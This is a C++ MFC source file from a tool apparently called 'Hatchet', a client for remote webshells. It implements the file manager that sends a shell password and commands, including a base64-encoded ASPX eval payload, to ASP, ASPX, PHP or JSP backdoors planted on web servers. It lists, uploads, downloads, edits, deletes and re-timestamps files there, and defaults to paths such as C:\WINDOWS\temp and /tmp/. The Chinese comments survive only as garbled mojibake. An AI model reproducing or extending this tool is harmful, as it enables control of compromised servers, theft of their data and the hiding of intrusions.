// FileDlg.cpp : ʵ���ļ�
//

#include "stdafx.h"
#include "Hatchet.h"
#include "FileDlg.h"
#include "MainHatchet.h"
#include "WgetDlg.h"


DWORD WINAPI GetFiles(LPVOID lpParam);	//�߳�
/*
afx_msg void GetFiles(CString szPath, bool bNoDB = false);
void CFileDlg::GetFiles(CString szPath, bool bNoDB)		//bNoDBΪ�棬��������
*/
//////////////////////////////////////////////////////////////////////////
bool bOnFileNewDirectory = false;		//�½�Ŀ¼,ʧȥ����ʱ�ж�
bool bOnFileRename = false;
bool bOnFileChangeTime = false;

struct DATA
{
	int subitem;		//�����ͷ������
	CListCtrl* plist;	//listctrl��ָ��
};
bool fav = false;			//ȫ�ֱ��� ��ʼ��Ϊ�������������ǽ�������

struct FunFileInfo	//�ϴ������ļ����߳�
{
	CString szSiteUrl;
	CString szSitePass;
	int nSiteCode;
	int nSiteScript;
	CString szS1;
	CString szS2;
	CFileDlg* pHwnd;			//OnFileRefresh();		//ˢ�� ����
};

DWORD WINAPI FunDownDirGetFiles(LPVOID lpParameter);							//����Ŀ¼���߳�
DWORD WINAPI FunDownloadFile(LPVOID lpParameter);								//�����ļ����߳�
DWORD WINAPI FunUploadFile(LPVOID lpParameter);									//�ϴ��ļ����߳�
bool			bIsOpenDir;														//�����ļ���ɣ��Ƿ���ļ��С�������ص���Ŀ¼��һ�ξͺá�
// CFileDlg �Ի���

IMPLEMENT_DYNAMIC(CFileDlg, CDialog)

CFileDlg::CFileDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CFileDlg::IDD, pParent)
{

}

CFileDlg::~CFileDlg()
{
	DestroyWindow();
}

void CFileDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_FILE_LIST, m_filelist);
	DDX_Control(pDX, IDC_FILE_TREE, m_dirtree);
	DDX_Control(pDX, IDC_EDIT_FILE_SUBITEM, m_SubItemEdit);
	DDX_Control(pDX, IDC_COMBO_FILEPATH, m_com_file_path);
}


BEGIN_MESSAGE_MAP(CFileDlg, CDialog)
	ON_WM_SIZE()
	ON_BN_CLICKED(IDC_READFILES, OnBnClickedReadfiles)
	ON_NOTIFY(NM_CLICK, IDC_FILE_TREE, OnNMClickTree1)
	ON_NOTIFY(NM_DBLCLK, IDC_FILE_LIST, OnNMDblclkList1)
	ON_NOTIFY(NM_RCLICK, IDC_FILE_LIST, OnNMRClickFilelist)
	ON_EN_KILLFOCUS(IDC_EDIT_FILE_SUBITEM, OnKillFocusSubItemEdit)
	ON_NOTIFY(LVN_COLUMNCLICK, IDC_FILE_LIST, OnLvnColumnclickList1)
	ON_COMMAND(ID_FILE_REFRESH, OnFileRefresh)				//ˢ��
	ON_COMMAND(ID_FILE_CLEARCACHE, OnFileClearCache)		//��ջ���
	ON_COMMAND(ID_FILE_NEWDIRECTORY, OnFileNewDirectory)	//�½�Ŀ¼
	ON_COMMAND(ID_FILE_NEWFILE, OnFileNewFile)				//�½��ļ�
	ON_COMMAND(ID_FILE_RENAME, OnFileRename)				//������
	ON_COMMAND(ID_FILE_CHANGETIME, OnFileChangeTime)		//����ʱ��
	ON_COMMAND(ID_FILE_EDITFILE, OnFileEditFile)			//�༭�ļ�
	ON_COMMAND(ID_FILE_DELETEFILES, OnFileDeleteFiles)		//ɾ���ļ�
	ON_COMMAND(ID_FILE_WGET, OnFileWget)					//WGET
	ON_COMMAND(ID_FILE_UPLOADFILE, OnFileUploadFile)		//�ϴ��ļ�
	ON_COMMAND(ID_FILE_DOWNLOADFILE, OnFileDownloadFile)	//�����ļ�
	
	ON_COMMAND(ID_FILE_CUT, OnFileCut)						//�ļ�����
	ON_COMMAND(ID_FILE_COPY, OnFileCopy)					//�ļ�����
	ON_COMMAND(ID_FILE_PASTE, OnFilePaste)					//�ļ�ճ��

	ON_WM_DROPFILES()
	//ON_NOTIFY(TVN_SELCHANGED, IDC_FILE_TREE, &CFileDlg::OnTvnSelchangedFileTree)		//���� TRUE ��ֹѡ����һ����� FALSE ������ѡ����һ�
	ON_NOTIFY(TVN_SELCHANGING, IDC_FILE_TREE, &CFileDlg::OnTvnSelchangingFileTree)		//���� TRUE ��ֹѡ����һ����� FALSE ������ѡ����һ�
	ON_BN_CLICKED(IDC_UPPERSTORY, &CFileDlg::OnBnClickedUpperstory)
END_MESSAGE_MAP()


// CFileDlg ��Ϣ�������

void CFileDlg::OnSize(UINT nType, int cx, int cy)
{
	CDialog::OnSize(nType, cx, cy);

	CRect rcClient;
	GetClientRect(rcClient);

	CRect	rcCWnd = rcClient;
	CWnd*	pCWnd   =   GetDlgItem(IDC_UPPERSTORY);
	if (pCWnd != NULL)
	{
		rcCWnd.top = 2;
		rcCWnd.left = 2;
		rcCWnd.bottom = 23;
		rcCWnd.right = 27;
		pCWnd->MoveWindow(rcCWnd);
	}

	rcCWnd = rcClient;
	pCWnd   =   GetDlgItem(IDC_COMBO_FILEPATH);
	if (pCWnd != NULL)
	{
		rcCWnd.top = 2;
		rcCWnd.left = 29;
		rcCWnd.bottom = 23;
		rcCWnd.right = rcCWnd.right-77;
		pCWnd->MoveWindow(rcCWnd);
	}

	rcCWnd = rcClient;
	pCWnd   =   GetDlgItem(IDC_READFILES);
	if (pCWnd != NULL)
	{
		rcCWnd.top = 2;
		rcCWnd.left = rcCWnd.right-75;
		rcCWnd.bottom = 23;
		pCWnd->MoveWindow(rcCWnd);
	}

	rcCWnd = rcClient;
	pCWnd   =   GetDlgItem(IDC_FILE_TREE);
	if (pCWnd != NULL)
	{
		rcCWnd.top = 25;
		rcCWnd.left = 2;
		rcCWnd.bottom = rcCWnd.bottom - 2;
		rcCWnd.right = 248;
		pCWnd->MoveWindow(rcCWnd);
	}

	rcCWnd = rcClient;
	pCWnd   =   GetDlgItem(IDC_FILE_LIST);
	if (pCWnd != NULL)
	{
		rcCWnd.top = 25;
		rcCWnd.left = 250;
		rcCWnd.bottom = rcCWnd.bottom - 2;
		rcCWnd.right = rcCWnd.right - 2;
		pCWnd->MoveWindow(rcCWnd);
	}
	//////////////////////////////////////////////////////////////////////////	�Զ��ı�LIST���
	/*
	m_filelist.InsertColumn(0,"FileName",LVCFMT_LEFT,300);
	m_filelist.InsertColumn(1,"Time",LVCFMT_LEFT,150);
	m_filelist.InsertColumn(2,"Size",LVCFMT_LEFT,80);
	m_filelist.InsertColumn(3,"Properties",LVCFMT_LEFT,40);
	*/
	if (pCWnd)
	{
		pCWnd->GetClientRect(rcClient);
		int nWidth = rcClient.Width()-150-80-40-20;
		m_filelist.SetColumnWidth(0, nWidth);
	}
	//////////////////////////////////////////////////////////////////////////
}

BOOL CFileDlg::OnInitDialog()
{
	CDialog::OnInitDialog();	

	GetDlgItem(IDC_UPPERSTORY)->SetFont(&m_FontSample);
	GetDlgItem(IDC_READFILES)->SetFont(&m_FontSample);
	GetDlgItem(IDC_COMBO_FILEPATH)->SetFont(&m_FontSample);
	GetDlgItem(IDC_FILE_TREE)->SetFont(&m_FontSample);
	GetDlgItem(IDC_FILE_LIST)->SetFont(&m_FontSample);
	GetDlgItem(IDC_EDIT_FILE_SUBITEM)->SetFont(&m_FontSample);

	m_edit.SetWindowText( "Files Management" );					//����״̬��

	szSiteUrl = szGlobal_SiteUrl;
	szSitePass = szGlobal_SitePass;
	nSiteScript = nGlobal_SiteScript;
	nSiteCode = nGlobal_SiteCode;

	if (nSiteCode == 65001)
	{
		szSiteCode = "UTF-8";
	}
	else if (nSiteCode == 936)
	{
		szSiteCode = "GB2312";
	}
	else if (nSiteCode == 950)
	{
		szSiteCode = "BIG5";
	}else{
		szSiteCode = "";
	}

	szCacheItem = szSiteUrl.Left( szSiteUrl.Find("/", 9) ) +"|";	//��ʼ�� Item
	szCacheItem.Replace("'", "''");

	// TODO:  �ڴ���Ӷ���ĳ�ʼ��
	LRESULT lstyle = m_filelist.SendMessage(LVM_GETEXTENDEDLISTVIEWSTYLE);
	lstyle |= LVS_EX_FULLROWSELECT| LVS_EX_GRIDLINES  ; //LVS_EX_CHECKBOXES | LVS_EX_FULLROWSELECT| LVS_EX_GRIDLINES 
	m_filelist.SendMessage(LVM_SETEXTENDEDLISTVIEWSTYLE,0,(LPARAM)lstyle);


	m_filelist.InsertColumn(0,"FileName",LVCFMT_LEFT,300);
	m_filelist.InsertColumn(1,"Time",LVCFMT_LEFT,150);
	m_filelist.InsertColumn(2,"Size",LVCFMT_LEFT,80);
	m_filelist.InsertColumn(3,"Properties",LVCFMT_LEFT,40);

	m_iImageTree.Create(16, 16, ILC_COLORDDB|ILC_MASK,10, 10);					//���ο��ļ��� �б�
	m_iImageTree.Add( AfxGetApp()->LoadIcon(IDI_DRIVE) );
	m_iImageTree.Add( AfxGetApp()->LoadIcon(IDI_DIR) );
	m_dirtree.SetImageList ( &m_iImageTree,TVSIL_NORMAL );

	m_iImageList.Create(16, 16, ILC_COLORDDB|ILC_MASK,10, 10);					//�б���ļ��� �б�
	m_iImageList.Add( AfxGetApp()->LoadIcon(IDI_DIR) );
	m_filelist.SetImageList ( &m_iImageList,LVSIL_SMALL );


	if (GetServerInfo() == false)
	{
		bCloseTab = true;
	}

	m_com_file_path.AddString("C:\\Documents and Settings\\All Users\\");
	m_com_file_path.AddString("C:\\RECYCLER\\");
	m_com_file_path.AddString("C:\\ProgramData\\");
	m_com_file_path.AddString("C:\\WINDOWS\\system32\\");
	m_com_file_path.AddString("C:\\WINDOWS\\temp\\");
	m_com_file_path.AddString("C:\\Program Files\\");
	m_com_file_path.AddString("C:\\Documents and Settings\\");
	m_com_file_path.AddString("C:\\Users\\Public\\");
	m_com_file_path.AddString("/tmp/");

	m_filelist.SetFocus();

	return TRUE;  // return TRUE unless you set the focus to a control
	// �쳣: OCX ����ҳӦ���� FALSE
}


void CFileDlg::OnBnClickedReadfiles()
{
	if (!bThreadFinish)
	{
		m_edit.SetWindowText( "GetFiles Threads busy" );					//����״̬��
		return;
	}

	CString temp;
	GetDlgItemText(IDC_COMBO_FILEPATH,temp);

	if (IsWin)
	{
		temp.Replace("/","\\");
		///////////////////////////////////////
		//2014.04.03 BUG
		//2014.01.13 BUG
		while(temp.Replace("//","/") != 0)
		{
		}
		while(temp.Replace("\\\\","\\") != 0)
		{
		}
		///////////////////////////////////////
		if (temp.Right(1) != "\\")
		{
			temp += "\\";
		}

		if (temp.Mid(0,1) == "\\")//���ʹ����ļ�
		{
			temp = "\\" + temp;
		}
	}else{
		temp.Replace("\\","/");
		///////////////////////////////////////
		//2014.04.03 BUG
		//2014.01.13 BUG
		while(temp.Replace("//","/") != 0)
		{
		}
		while(temp.Replace("\\\\","\\") != 0)
		{
		}
		///////////////////////////////////////
		if (temp.Right(1) != "/")
		{
			temp += "/";
		}
	}

	//2014.04.03 BUG end
	//2014.01.13 BUG end
	//GetFiles(temp);
	GetFiles_szPath = temp;
	GetFiles_bNoDB = false;//Ĭ�� false
	bThreadFinish = false;
	CreateThread(NULL, 0, GetFiles, (LPVOID)this, 0, 0);
}

bool CFileDlg::GetServerInfo()																//��ȡ��������Ϣ
{
	CString temp;
	pMydbTmp->Select("select Dat from CACHE where Item='"+ szCacheItem +"base'", MydbTmpArray);
	if (MydbTmpArray.GetSize() == 0)		// û�л�������
	{
		if (nSiteScript == 2)					//ASPX �б���
		{
			szFileFamatPageCode.Format("%d", nSiteCode);
			temp = szFileGetInfo[nSiteScript-1];
			temp.Replace("%nPageCode%", szFileFamatPageCode);
			bHttpIsOK = MyHttp(szSiteUrl, szSitePass + temp, nSiteCode, temp, szError);
			
		}else if (nSiteScript == 4)				//JSP �б���
		{
			bHttpIsOK = MyHttp(szSiteUrl, szSitePass + "=A&z0="+szSiteCode, nSiteCode, temp, szError);
			
		}else{
			bHttpIsOK = MyHttp(szSiteUrl, szSitePass + szFileGetInfo[nSiteScript-1], nSiteCode, temp, szError);
		}
		if (!bHttpIsOK)
		{
			AfxMessageBox( szError );
			return false;
		}
		pMydbTmp->Execute("INSERT INTO CACHE (Item,Dat) VALUES ('"+ szCacheItem +"base','"+ temp +"')");			//���滺��
	}else{
		temp = MydbTmpArray.GetAt(0);		// ����������
	}	

	int posX = temp.Find("\t");
	int posY = temp.Find("\t", posX+1);
	if (posY == -1)
	{
		posY = temp.GetLength();
	}

	WWWRoot = temp.Mid(0,posX);
	if (WWWRoot[0] == '/')
	{
		WWWRoot.Replace("\\","/");
		IsWin = false;
	}else{
		WWWRoot.Replace("/","\\");
		IsWin =true;
	}

	///////////////////////////////////////
	//2014.04.03 BUG	���صľ�ȻҲ�ж�� б��
	while(WWWRoot.Replace("//","/") != 0)
	{
	}
	while(WWWRoot.Replace("\\\\","\\") != 0)
	{
	}
	///////////////////////////////////////

	if (IsWin)
	{
		if (WWWRoot[WWWRoot.GetLength()-1] != '\\')
		{
			WWWRoot = WWWRoot+"\\";
		}

		CStringArray dirs;
		dirs.RemoveAll();
		decodeCString(temp.Mid(posX+1, posY-posX-1), dirs, ':');

		int nIndex=(int)dirs.GetCount();
		if (nIndex > 0)
		{
			int i=0;
			CString Jsptemp;
			while(i < nIndex)
			{
				HTREEITEM m_hRoot;
				m_hRoot = m_dirtree.InsertItem(dirs.GetAt(i)+":", TVI_ROOT,TVI_LAST);
				m_dirtree.Expand(m_hRoot, TVE_EXPAND);
				i++;
			}
		}else{						//2014.04.03 BUG ��ȡ����ʧ�ܣ���ӵ�һ���ַ�
			HTREEITEM m_hRoot;
			m_hRoot = m_dirtree.InsertItem(WWWRoot.Mid(0,1)+":", TVI_ROOT,TVI_LAST);
			m_dirtree.Expand(m_hRoot, TVE_EXPAND);
		}
	}else{
		HTREEITEM m_hRoot = m_dirtree.InsertItem("/", TVI_ROOT,TVI_LAST);			//Linux ���� /
		if (WWWRoot[WWWRoot.GetLength()-1] != '/')
		{
			WWWRoot = WWWRoot+"/";
		}
	}


//	szSystemInfo = temp.Mid(posY+1, temp.GetLength()-posY-1);			//��������Ϣ

	SetDlgItemText(IDC_COMBO_FILEPATH, WWWRoot);


	GetFiles_szPath = WWWRoot;
	GetFiles_bNoDB = false;//Ĭ�� false
	bThreadFinish = false;
	CreateThread(NULL, 0, GetFiles, (LPVOID)this, 0, 0);

	return true;
}


void CFileDlg::OnNMDblclkList1(NMHDR *pNMHDR, LRESULT *pResult)											//�ļ��б��˫��������ļ���
{
	LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);
	CString temp;
	int nList = m_filelist.GetNextItem(-1,LVNI_SELECTED);
	if (nList < 0) return;//������ȡ�б�����ݵ�С���⡣

	if (!bThreadFinish)
	{
		m_edit.SetWindowText( "GetFiles Threads busy" );					//����״̬��
		return;
	}

	GetDlgItemText(IDC_COMBO_FILEPATH,temp);

	LV_ITEM lvitem = {0};
	lvitem.iItem = nList;
	lvitem.iSubItem = 0;
	lvitem.mask = LVIF_TEXT|LVIF_IMAGE|LVIF_PARAM;				//����ͼ���ж��ļ�����
	m_filelist.GetItem(&lvitem);

	if (lvitem.iImage== 0)				// ���ļ���
	{
		if (IsWin)
		{
			GetFiles_szPath = temp + m_filelist.GetItemText(nList,0) + "\\";
			GetFiles_bNoDB = false;//Ĭ�� false
			bThreadFinish = false;
			CreateThread(NULL, 0, GetFiles, (LPVOID)this, 0, 0);

			//GetFiles(temp + m_filelist.GetItemText(nList,0) + "\\");
		}else{
			GetFiles_szPath = temp + m_filelist.GetItemText(nList,0) + "/";
			GetFiles_bNoDB = false;//Ĭ�� false
			bThreadFinish = false;
			CreateThread(NULL, 0, GetFiles, (LPVOID)this, 0, 0);

			//GetFiles(temp + m_filelist.GetItemText(nList,0) + "/");
		}
	}else{																		// ���ļ����༭�ļ�
		CString szCommonFileType = ".jpg.gif.png.bmp.jpeg.ico.zip.rar.tgz.7z.tar.gz.iso.cab.bz2.jar.dmg.exe.msi.dll.sys.avi.mpeg.mpg.vob.rmvb.wmv.mp3.mp4.3gp.ogg.voc"
			".swf.pdf.flv.fla.psd.doc.docx.xls.xlsx.ppt.pptx.mdb.rtf.";
		CString szFilesTypeName = m_filelist.GetItemText(nList,0);
		szFilesTypeName = szFilesTypeName.Right( rfind(szFilesTypeName, ".") );

		if (szFilesTypeName == "" || szCommonFileType.Find(szFilesTypeName + ".") == -1)
		{
			//AfxMessageBox("�ļ��༭: "+ temp+ m_filelist.GetItemText(nList,0));
			CMainHatchet* pMainHatchet = (CMainHatchet*)AfxGetMainWnd();
			szGlobal_SiteUrl = szSiteUrl;
			szGlobal_SitePass = szSitePass;
			nGlobal_SiteScript = nSiteScript;
			nGlobal_SiteCode = nSiteCode;
			szGlobal_SiteFileSave = temp+ m_filelist.GetItemText(nList,0);
			pMainHatchet->AddFileSaveTab();

			*pResult = 0;
			return;
		}else{
			//	���� ����
			OnFileDownloadFile();											//�����ļ�
		}
	}
	m_filelist.SetFocus();
	*pResult = 0;
}

//void CFileDlg::GetFiles(CString szPath, bool bNoDB)		//bNoDBΪ�棬��������
DWORD WINAPI GetFiles(LPVOID lpParam)
{
	CFileDlg* pDlg = (CFileDlg*)lpParam;

	m_edit.SetWindowText( "Reading File: " + pDlg->GetFiles_szPath );					//����״̬��

	CString temp;
	/*path = C:\WWW\ */

	if (pDlg->m_com_file_path.FindStringExact(-1, pDlg->GetFiles_szPath) == CB_ERR)		//û�м�¼������
	{
		pDlg->m_com_file_path.InsertString(0, pDlg->GetFiles_szPath);
	}
	

	pDlg->m_hNowItem = FindItems(pDlg->m_dirtree, pDlg->GetFiles_szPath, pDlg->IsWin);
	if (pDlg->m_hNowItem == NULL)									//�����ļ������������ӵ�ӳ�����������̵ȣ���ʾ�������⡣
	{
		if (pDlg->IsWin)
		{
			pDlg->m_hNowItem = pDlg->m_dirtree.InsertItem(pDlg->GetFiles_szPath.Mid(0, 1)+":", TVI_ROOT,TVI_LAST);
			pDlg->m_dirtree.Expand(pDlg->m_hNowItem, TVE_EXPAND);
		}
	}
	
	if(pDlg->m_dirtree.GetItemState(pDlg->m_hNowItem, TVIS_EXPANDED) != TVIS_EXPANDED)// ������
	{
		pDlg->m_dirtree.Expand(pDlg->m_hNowItem, TVE_EXPAND);
	}
	pDlg->m_dirtree.Select(pDlg->m_hNowItem, TVGN_DROPHILITE);		//���ο򣬸���
	

	CString szSqlTemp = pDlg->GetFiles_szPath;
	//szSqlTemp.Replace("\\","\\\\");	2015.01.20 IPC BUG
	szSqlTemp.Replace("'","''");

	MydbTmpArray.RemoveAll();
	if (pDlg->GetFiles_bNoDB)
	{
		pMydbTmp->Execute("Delete from CACHE where Item='"+ pDlg->szCacheItem + szSqlTemp +"'");		//��ջ���
	}else{
		pMydbTmp->Select("Select Dat from CACHE where Item='"+ pDlg->szCacheItem + szSqlTemp +"'", MydbTmpArray);				//��ѯ����
	}

	if (MydbTmpArray.GetSize() == 0)			// û�л�������
	{
		if (pDlg->nSiteScript == 1)								//	ASP
		{
			temp = UrlEnCode(pDlg->nSiteCode, pDlg->GetFiles_szPath, false, true);
			bHttpIsOK = MyHttp(pDlg->szSiteUrl, pDlg->szSitePass + szFileGetFiles[pDlg->nSiteScript-1] + "&z1="+temp, pDlg->nSiteCode, temp, szError);
		}else if (pDlg->nSiteScript == 2)							//  ASPX
		{
			pDlg->szFileFamatPageCode.Format("%d", pDlg->nSiteCode);
			temp = MyBase64Encode(pDlg->nSiteCode, pDlg->GetFiles_szPath);
			temp = szFileGetFiles[pDlg->nSiteScript-1] + "&z1="+temp;
			temp.Replace("%nPageCode%", pDlg->szFileFamatPageCode);

			CString szBase64EvalCode = "var D=System.Text.Encoding.GetEncoding("+ pDlg->szFileFamatPageCode +").GetString(System.Convert.FromBase64String(Request.Item[\"z1\"]));"
				"var m=new System.IO.DirectoryInfo(D);var s=m.GetDirectories();var P:String;var i;function T(p:String):String{re"
				"turn System.IO.File.GetLastWriteTime(p).ToString(\"yyyy-MM-dd HH:mm:ss\");}for(i in s){P=D+s[i].Name;Response.W"
				"rite(s[i].Name+\"/\\t\"+T(P)+\"\\t0\\t-\\n\");}s=m.GetFiles();for(i in s){P=D+s[i].Name;Response.Write(s[i].Name+\""
				"\\t\"+T(P)+\"\\t\"+s[i].Length+\"\\t-\\n\");}";
			szBase64EvalCode = MyBase64Encode(-1, szBase64EvalCode);
			temp.Replace("%szBase64EvalCode%", szBase64EvalCode);

			bHttpIsOK = MyHttp(pDlg->szSiteUrl, pDlg->szSitePass + temp, pDlg->nSiteCode, temp, szError);
		}else if(pDlg->nSiteScript == 3){							//  PHP
			temp = MyBase64Encode(pDlg->nSiteCode, pDlg->GetFiles_szPath);
			bHttpIsOK = MyHttp(pDlg->szSiteUrl, pDlg->szSitePass + szFileGetFiles[pDlg->nSiteScript-1] + "&z1="+temp, pDlg->nSiteCode, temp, szError);
		}else if (pDlg->nSiteScript == 4)							//  JSP
		{
			bHttpIsOK = MyHttp(pDlg->szSiteUrl, pDlg->szSitePass + "=B&z0="+pDlg->szSiteCode+ "&z1="+ UrlEnCode(pDlg->nSiteCode, pDlg->GetFiles_szPath), pDlg->nSiteCode, temp, szError);
		}
		
		if (pDlg->m_hWnd == NULL)		//����ִ�У�����رվͱ����ˡ�
		{
			return 0;
		}
		if (!bHttpIsOK)
		{
			AfxMessageBox( szError );
			pDlg->bThreadFinish = true;
			return 0;
		}
		if (temp.Left(8) == "ERROR://")
		{
			m_edit.SetWindowText( temp );					//����״̬��
			pDlg->bThreadFinish = true;
			return 0;
		}
		CString szCathDat = temp;
		szCathDat.Replace("'", "''");
		pMydbTmp->Execute("INSERT INTO CACHE (Item,Dat) VALUES ('"+ pDlg->szCacheItem + szSqlTemp +"','"+ szCathDat +"')");			//���滺��
	}else{
		temp = MydbTmpArray.GetAt(0);		// ����������
	}

	pDlg->SetDlgItemText(IDC_COMBO_FILEPATH, pDlg->GetFiles_szPath);			//����·����ַ���Ƶ����˳�����⣬��ɺ�����edit


	pDlg->m_filelist.DeleteAllItems();

	CString szFileNameLine;
	CString szFileName;
	int posX=0;
	int posY=0;
	int nFolder=0,nFile=0;//����

	CString szIcoTemp = "";

	int posA = 0,			//decodeCString �����ݴ���������
		posB = 0;
	//////////////////////////////////////////////////////////////////////////
	CString szTreeExistItem = "";						//���������ο����ݵ�	Ч�����⡣
	CString szTreeExistItemTemp = "";
	HTREEITEM hItem = pDlg->m_dirtree.GetChildItem( pDlg->m_hNowItem );
	while ( hItem )		//�������У�����
	{
		szTreeExistItem = szTreeExistItem + "|" + pDlg->m_dirtree.GetItemText(hItem);
		hItem = pDlg->m_dirtree.GetNextItem( hItem, TVGN_NEXT );
	}
	szTreeExistItem = szTreeExistItem + "|";
	if (pDlg->IsWin)
	{
		szTreeExistItem.MakeLower();//תСд�Ƚ�
	}
	//////////////////////////////////////////////////////////////////////////
	
	while(posA != -1)
	{
		posA = temp.Find("\n", posB + 1);
		if (posA == -1)
		{
			break;
		}

		szFileNameLine = temp.Mid(posB, posA - posB);
		szFileNameLine.TrimLeft();
		szFileNameLine.TrimRight();
		posB = posA;

		posX = szFileNameLine.Find("\t");
		posY = szFileNameLine.Find("\t", posX+1);
		szFileName = szFileNameLine.Mid(0,posX);
		
		if (szFileName != "./" && szFileName != "../" && szFileName != "")
		{
			int m_i = pDlg->m_filelist.GetItemCount();
			int szFileNameLen = szFileName.GetLength();
			if (szFileName[szFileNameLen-1] == '/')			//���ļ���
			{
				nFolder++;
				szFileName.Replace("/","");
				pDlg->m_filelist.InsertItem(m_i, szFileName, 0);

				//		���Ч������
				szTreeExistItemTemp = szFileName;
				if (pDlg->IsWin)
				{
					szTreeExistItemTemp.MakeLower();//תСд�Ƚ�
				}
				if ( szTreeExistItem.Find("|"+szTreeExistItemTemp+"|") == -1)	//�Ƿ���ڣ����ھͲ�������
				{
					pDlg->m_dirtree.InsertItem(szFileName,1,1, pDlg->m_hNowItem);
					pDlg->m_dirtree.Expand(pDlg->m_hNowItem, TVE_EXPAND);
				}
				
				//m_filelist.SetItemData(m_i,1);					//��¼���ļ��л����ļ��������ͻ������ͼ���ж�
			}else{																		//�����ļ���
				nFile++;
				CString szFilesTypeName = szFileName.Right( rfind(szFileName, ".") );
				szFilesTypeName.MakeLower();	//ת��Сд�Ա�
				int StringArrPosX = GetStringArrPos(&pDlg->szFilesArrCont, szFilesTypeName);
				if (StringArrPosX == -1)									//֮ǰû��ȡ������Ҫ���»�ȡͼ��
				{
					//////////////////////////////////////////////////////////////////////////
					HICON hIcon;
					
					if (szFilesTypeName == ".exe")										//EXE�ļ�
					{
						ExtractIconEx("SHELL32.DLL", 2, NULL, &hIcon, 1);
						if(hIcon)
						{
							pDlg->szFilesArrCont.Add( szFilesTypeName );
							StringArrPosX = pDlg->m_iImageList.Add( hIcon );
						}
					}else if(szFilesTypeName == ".dll" || szFilesTypeName == ".ocx")								//DLL OCX �ļ�
					{
						ExtractIconEx("SHELL32.DLL", 72, NULL, &hIcon, 1);
						if(hIcon)
						{
							pDlg->szFilesArrCont.Add( szFilesTypeName );
							StringArrPosX = pDlg->m_iImageList.Add( hIcon );
						}
					}else{
						szIcoTemp = "";
						HKEY hKey;
						BYTE byBuffer[1024];
						DWORD dwLen = 1024;
						DWORD htype = REG_SZ;
						if(::RegOpenKeyEx(HKEY_CLASSES_ROOT, szFilesTypeName, 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS)
						{
							if(::RegQueryValueEx(hKey, NULL, 0, &htype, byBuffer, &dwLen) == ERROR_SUCCESS)
							{
								szIcoTemp.Format("%s\\DefaultIcon", byBuffer);
							}
							RegCloseKey (hKey);
						}
						dwLen = 1024;
						if (szIcoTemp != "")
						{
							if(::RegOpenKeyEx(HKEY_CLASSES_ROOT, szIcoTemp, 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS)
							{
								if(::RegQueryValueEx(hKey, NULL, 0, &htype, byBuffer, &dwLen) == ERROR_SUCCESS)
								{
									szIcoTemp.Format("%s", byBuffer);
								}
								RegCloseKey (hKey);
							}
						}
					
						//ע���滻������˫���� "
						szIcoTemp.Replace("\"","");
					
						CString strFile,strIndex;
						AfxExtractSubString(strFile, szIcoTemp, 0, ',');
						AfxExtractSubString(strIndex, szIcoTemp, 1, ',');
					
						ExtractIconEx(strFile,atoi(strIndex),NULL,&hIcon,1);

						if(!hIcon)
						{
							//AfxMessageBox("�� 111");
							ExtractIconEx("SHELL32.DLL", 0, NULL, &hIcon, 1);
							if(!hIcon)
							{
								//AfxMessageBox("�� 333");
							}
						}
						pDlg->szFilesArrCont.Add( szFilesTypeName );
						StringArrPosX = pDlg->m_iImageList.Add( hIcon );
						//////////////////////////////////////////////////////////////////////////
					}
				}else{
					//AfxMessageBox("�Ѿ���ȡ����: "+szFileName);
					StringArrPosX++;
				}
				pDlg->m_filelist.InsertItem(m_i, szFileName, StringArrPosX);					//�Ѿ���ȡ����ͼ�ֱ꣬����
				//m_filelist.SetItemData(m_i,0);					//��¼���ļ��л����ļ��������ͻ������ͼ���ж�
			}

			pDlg->m_filelist.SetItemText(m_i, 1,szFileNameLine.Mid(posX+1, posY-posX-1));

			posX = szFileNameLine.Find("\t", posY+1);
			pDlg->m_filelist.SetItemText(m_i, 2,szFileNameLine.Mid(posY+1, posX-posY-1));
			
			pDlg->m_filelist.SetItemText(m_i, 3,szFileNameLine.Mid(posX+1, szFileNameLine.GetLength()-posX-1));
		}
	}
	CString sz_edit;
	sz_edit.Format("Folder(%d),File(%d)", nFolder, nFile);
	m_edit.SetWindowText( sz_edit );					//����״̬��

	pDlg->bThreadFinish = true;
	pDlg->m_filelist.SetFocus();
	return 0;
}

void CFileDlg::OnNMRClickFilelist(NMHDR *pNMHDR, LRESULT *pResult)			//�Ҽ�����
{
	LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);

	nSelectList = m_filelist.GetNextItem(-1,LVNI_SELECTED);

	CMenu popMenu;
	VERIFY(popMenu.LoadMenu(IDR_MENU1));
	CMenu *p=popMenu.GetSubMenu(4);
	ASSERT(p!=NULL);
	CPoint pt;
	GetCursorPos(&pt);
	p->TrackPopupMenu(TPM_RIGHTBUTTON, pt.x, pt.y,this);
	
	*pResult = 0;
}

void CFileDlg::OnFileRefresh()				//ˢ��
{
	m_edit.SetWindowText( "Refreshing" );					//����״̬��

	if (!bThreadFinish)
	{
		m_edit.SetWindowText( "GetFiles Threads busy" );					//����״̬��
		return;
	}

	CString szOnFileRefreshtemp;
	GetDlgItemText(IDC_COMBO_FILEPATH,szOnFileRefreshtemp);
	if (szOnFileRefreshtemp != "")
	{
		GetFiles_szPath = szOnFileRefreshtemp;
		GetFiles_bNoDB = true;//Ĭ�� false
		bThreadFinish = false;
		CreateThread(NULL, 0, GetFiles, (LPVOID)this, 0, 0);

		//GetFiles(szOnFileRefreshtemp, true);
	}
}

void CFileDlg::OnFileNewFile()				//�½��ļ�
{
	CString szOnFileNewFile;
	GetDlgItemText(IDC_COMBO_FILEPATH, szOnFileNewFile);
	
	CMainHatchet* pMainHatchet = (CMainHatchet*)AfxGetMainWnd();
	szGlobal_SiteUrl = szSiteUrl;
	szGlobal_SitePass = szSitePass;
	nGlobal_SiteScript = nSiteScript;
	nGlobal_SiteCode = nSiteCode;
	
	if (IsWin)
	{
		szGlobal_SiteFileSave = szOnFileNewFile.Mid(0, szOnFileNewFile.GetLength() - rfind(szOnFileNewFile, "\\")+1) + "Newfile^_^.txt";
	}else{
		szGlobal_SiteFileSave = szOnFileNewFile.Mid(0, szOnFileNewFile.GetLength() - rfind(szOnFileNewFile, "/")+1) + "Newfile^_^.txt";
	}
	
	pMainHatchet->AddFileSaveTab();
}

void CFileDlg::OnFileRename()									//������
{
	if(nSelectList != -1)
	{
